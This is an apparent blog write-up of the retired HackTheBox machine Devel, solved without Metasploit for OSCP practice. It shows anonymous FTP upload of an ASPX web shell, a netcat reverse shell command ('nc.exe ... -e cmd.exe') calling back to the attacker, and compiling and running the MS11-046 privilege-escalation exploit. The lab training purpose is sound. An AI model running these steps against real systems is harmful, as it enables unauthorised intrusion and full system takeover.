---
published: false
---
## #1. OSCP Prep - HTB Series :: Devel Writeup (without metasploit)

Hi, this is my write up for the easy box **Devel** on Hackthebox. This is a retired windows machine and can be easily exploited in a matter of minutes is Metasploit. However, as this is for OSCP preparation, no metasploit will be used.

![devel_graphi]({{site.baseurl}}/_posts/devel_graphic.PNG)

If you enjoyed this write up feel free to follow me on twitter. Let's get started!! :)

___

### 1. Enumeration

#### nmap

Quick nmap scan on all ports to find the services that the machine has open:

	nmap -p- $IP -oN nmap.txt
    
    PORT   STATE SERVICE
	21 tcp open  ftp
	80 tcp open  http

We can see that the box is listening on **FTP (21)** and **HTTP (80)**.

Next aggressive scan to perform some service enumeration and default scripts against returned listening ports:

	nmap -p 21,80 -A $IP
	
    PORT   STATE SERVICE VERSION
    21 tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | 03-18-17  01:06AM       DIR          aspnet_client
    | 03-17-17  04:37PM                  689 iisstart.htm
    |_03-17-17  04:37PM               184946 welcome.png
    | ftp-syst: 
    |_  SYST: Windows_NT
    80 tcp open  http    Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS 7.5
    |_http-title: IIS7
	

Few items to note here:

**1.HTTP:**
- Running **IIS version 7.5**, this has been information has been pulled from server headers
- Allows the use of the **HTTP TRACE** verb; not useful to us in this scenario but worth noting if this was a pen test
- **HTTP-TITLE is IIS7** (potentially a **default test page**)

**1.FTP**
- **Anonymous login acess allowed**
- A listing of the directory when accessed anonymously

I like to normally go for HTTP first so let's do that :)

___

### 2. Further enumeration - HTTP

Accessing the web page we notice that this is indeed a default test page when configuring IIS:

![default_test_page]({{site.baseurl}}/_posts/2021-02-02 15_57_40-Window.png)

If we look at the sourcecode we can see the welcome.png file is hosted locally on the server:

![2021-02-02 16_03_57-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_03_57-Window.png)

We can run other tools like dirbuster etc but this information has lead to me to believe FTP is the path we should pursue...

___

### 3. Further enumeration - FTP

As shown earlier FTP allows anonymous access: that is where **username=anonymous** and **password=anything**. The following demonstrates how to do this:

	ftp $IP
    
    Connected to 10.129.90.59.
	220 Microsoft FTP Service
    Name (10.129.90.59:muzz): anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password:
    230 User logged in.
    Remote system type is Windows_NT.
    ftp>

From this terminal we can run commands like **ls** to get a directory listing etc. The **help** command shows what's available. Doing a directory listing shows the files that te nmap scan previously picked up:

	ftp> ls
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    03-18-17  01:06AM       <DIR>          aspnet_client
    03-17-17  04:37PM                  689 iisstart.htm
    03-17-17  04:37PM               184946 welcome.png
    226 Transfer complete.
    ftp>

The file welcome.png and isstart.htm are of particular interest. Welcome.png is what was observed in the browser, indicating the FTP directory is very likely hosted in C:/inetpub/wwwroot.

To test this we create a file called test.txt and upload this to the server via FTP PUT:

	touch test.txt
    
    ftp> put test.txt
    local: test.txt remote: test.txt
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    226 Transfer complete.
    ftp>
    
    ftp> ls
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    03-18-17  01:06AM       <DIR>          aspnet_client
    03-17-17  04:37PM                  689 iisstart.htm
    02-02-21  06:17PM                    0 test.txt
    03-17-17  04:37PM               184946 welcome.png
    226 Transfer complete.
    ftp>


The file has been successfully uploaded. Let's try and access this via the browser:

![2021-02-02 16_19_18-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_19_18-Window.png)

So we now know we can access any resource we upload via FTP from the browser. This means if we were to set upload a reverse shell via FTP access it via FTP, we can setup a call back and get a shell. Let's try this.

___

### 4. Getting our 1st shell (Foothold)

As we can't use FTP we will have to be creative. As this is IIS, it is likely running **.ASP** or **.ASPX** as it's web framework, **NOT PHP**. 

I will go for .ASPX.

Kali linux has inbuilt web shells for .ASPX which can be located at **/usr/share/webshells/aspx/**. Copy the **cmdasp.apsx** web shell from here to our local dir:

	ls /usr/share/webshells/aspx/
	cmdasp.aspx
    
    cp /usr/share/webshells/aspx/cmdasp.aspx .

There are **NO** changes to be made to file. Upload this file via FTP and then access the resource through the browser:

![2021-02-02 16_31_45-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_31_45-Window.png)


This is will allow us to run **windows commands** via a HTML page as can be seen above when running **whoami**.

So how do we get a shell from here?

We can upload netcat **(nc.exe)**, set up our listener and get a callback. This can be done as follows:

1. copy nc.exe to local dir:
	- cp /usr/share/windows-resources/binaries/nc.exe:
    
2. upload nc.exe to server via FTP
 	- ftp put nc.exe
        
3. setup our local machine listener for the call back:
  	- nc -nlvp 4444
    
4. go to $IP/cmdasp.aspx in the browser and find where is located
  	- dir "\cmdasp.aspx" /s

5. run nc.exe in browser to initate call back
	- c:\inetpub\wwwroot\nc.exe $our_IP 4444 -e cmd.exe

![2021-02-02 16_49_45-Window.png]({{site.baseurl}}/_posts/2021-02-02 16_49_45-Window.png)

After doing this we should get a call back on our listener and gained our foothold:

![2021-02-02 17_11_33-Window.png]({{site.baseurl}}/_posts/2021-02-02 17_11_33-Window.png)

However we are not SYSTEM, to do this we must escalate our privileges through the means of a **local exploit**

___

### 5. Getting SYSTEM

If we run **systeminfo** we can fingerprint the OS version and try and find available exploits online or in exploit-db:

	c:\windows\system32\inetsrv>systeminfo
    
    Host Name:                 DEVEL
    OS Name:                   Microsoft Windows 7 Enterprise 
    OS Version:                6.1.7600 N/A Build 7600
    ...
    System Type:               X86-based PC
    Processor(s):              1 Processor(s) Installed.
                               [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
    ...

    c:\windows\system32\inetsrv>

What immediately stands out is the **OS name** and **version** - **Windows 7 6.1.7600**. Furthermore, running a **x64** processor

If we google for **"Windows 7 6.1.7600"** we find out there's a local privsec exploit - **MS11-046**

This is on exploit-db so we can find it on our local kali machine using:
	
    	searchsploit MS11-046

![2021-02-02 17_24_12-Window.png]({{site.baseurl}}/_posts/2021-02-02 17_24_12-Window.png)

1st option as the 2nd is listed a **dos** not **local**.

It's listed as x86 so let's inspect the code to see if it will run on x64 too...

- searchsploit -m windows_x86/local/40564.c

Some things to note:

- In the file in line 24 it listed Windows 7 x64 as vulnerable 
- Exploit has been tested on  Windows 7 build 6.1.7600

This matches our criteria. Furthermore the exploit also tells us how to compile to .c file in a windows .exe:

- i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32

With all this now known let's test this.

1. compile .c file to .exe
	- i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32

2. upload .exe via FTP (or however you want to get the .exe on the machine)
	-  ftp> binary ; ftp> put MS11046.exe

3. navigated to inetpub/wwwroot
	- cd c:\inetpub\wwwroot

4. run the executable
	- MS11046.exe

...and if all went well you should now be SYSTEM

![2021-02-02 17_43_54-Window.png]({{site.baseurl}}/_posts/2021-02-02 17_43_54-Window.png)

Finally, grab your user.txt and root.txt flags to complete the box.

And that was my guide how to get SYSTEM on Devel without Metasploit.

Thanks for reading and I will hopefully be adding to this series in the near future!

___


